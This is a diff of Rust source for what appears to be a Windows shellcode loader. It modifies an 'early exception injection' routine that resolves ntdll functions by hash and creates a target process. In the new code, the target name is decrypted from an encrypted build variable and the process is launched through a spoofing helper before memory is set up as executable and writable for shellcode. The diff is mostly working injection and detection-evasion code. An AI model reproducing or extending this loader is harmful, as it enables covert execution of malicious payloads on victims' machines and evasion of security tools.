@@ -1,5 +1,4 @@
 use std::ffi::c_void;
-use windows_sys::Win32::System::Threading::{CREATE_SUSPENDED};
 use windows_sys::Win32::System::Diagnostics::Debug::CONTEXT;
 use crate::syscall::common::env::get_loaded_module_by_hash;
 use crate::syscall::common::pe::get_export_by_hash;
@@ -15,14 +14,26 @@ const NT_PROTECT_HASH: u32 = crate::dbj2_hash!(b"NtProtectVirtualMemory");
 const NT_TEST_ALERT_HASH: u32 = crate::dbj2_hash!(b"NtTestAlert");
 
 #[cfg(feature = "run_early_exception_inject")]
-pub unsafe fn exec(shellcode_ptr: usize, shellcode_len: usize, target_program: &str) -> Result<(), String> {
+pub unsafe fn exec(shellcode_ptr: usize, shellcode_len: usize) -> Result<(), String> {
     #[cfg(feature = "debug")]
     crate::utils::print_message("Executing via Early Exception Inject...");
     
     let ntdll = get_loaded_module_by_hash(NTDLL_HASH).ok_or("Failed to get ntdll")?;
     let wow64_prepare_for_exception = wow64::return_wow64_function_pointer(ntdll as *mut u8).ok_or("Failed to find Wow64PrepareForException")?;
     
-    let process_info = crate::utils::remote::create_process(target_program, CREATE_SUSPENDED)?;
+    use crate::utils::simple_decrypt;
+    let target_program = simple_decrypt(env!("RSL_ENCRYPTED_TARGET_PROGRAM"));
+
+    #[cfg(feature = "debug")]
+    {
+        crate::utils::print_message(&format!("[DEBUG] early_exception_inject target_program raw: '{}'", target_program));
+        match crate::api::normalize_nt_path(target_program.as_str()) {
+            Ok(p) => crate::utils::print_message(&format!("[DEBUG] early_exception_inject normalized nt path: '{}'", p)),
+            Err(e) => crate::utils::print_message(&format!("[DEBUG] normalize_nt_path failed: {}", e)),
+        }
+    }
+
+    let process_info = crate::api::create_process_with_spoofing(target_program.as_str(), true)?;
 
     // Allocate memory for shellcode
     use crate::api::PAGE_EXECUTE_READWRITE;
